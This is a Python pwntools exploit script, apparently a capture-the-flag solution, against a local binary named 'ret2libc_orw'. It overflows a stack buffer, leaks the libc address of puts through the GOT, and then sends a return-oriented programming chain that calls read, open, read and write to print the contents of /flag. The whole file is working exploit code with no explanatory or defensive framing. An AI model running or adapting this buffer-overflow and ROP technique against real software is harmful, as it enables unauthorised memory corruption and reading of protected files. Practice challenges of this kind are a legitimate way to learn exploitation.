from pwn import *
from struct import pack
from ctypes import *
import base64
#from LibcSearcher import *

def debug(c = 0):
    if(c):
        gdb.attach(p, c)
    else:
        gdb.attach(p)
        pause()
def get_sb() : return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))
#-----------------------------------------------------------------------------------------
s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg= lambda s, num   :p.success('%s -> 0x%x' % (s, num))
#-----------------------------------------------------------------------------------------

context(os='linux', arch='amd64', log_level='debug')
p = process('./ret2libc_orw')
elf = ELF('./ret2libc_orw')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401333
ret = 0x40101a

#debug('b *0x4012a0')

sa(b'>>\n', b'a'*0x10 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln']))

libc_base = l64() - libc.sym['puts']
system, binsh = get_sb()

rax = libc_base + 0x45eb0
syscall = libc_base + next(libc.search(asm('syscall; ret;')))
rdi = libc_base + 0x2a3e5
rsi = libc_base + 0x2be51
rdx_r12 = libc_base + 0x11f497
mprotect = libc_base + libc.sym['mprotect']
open_ = libc_base + libc.sym['open']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
buf = 0x4040D0
flag = 0x4040a0

payload = b'a'*0x10
# read flag -> buf
payload += p64(rdi) + p64(0) + p64(rsi) + p64(flag) + p64(rdx_r12) + p64(8)*2 + p64(read)
# open flag
payload += p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(open_)
# read flag
payload += p64(rdi) + p64(3) + p64(rsi) + p64(buf) + p64(rdx_r12) + p64(0x30)*2 + p64(read)
# write flag
payload += p64(rdi) + p64(1) + p64(write)

sa(b'>>\n', payload)

sleep(1)
s(b'/flag')

#pause()
inter()

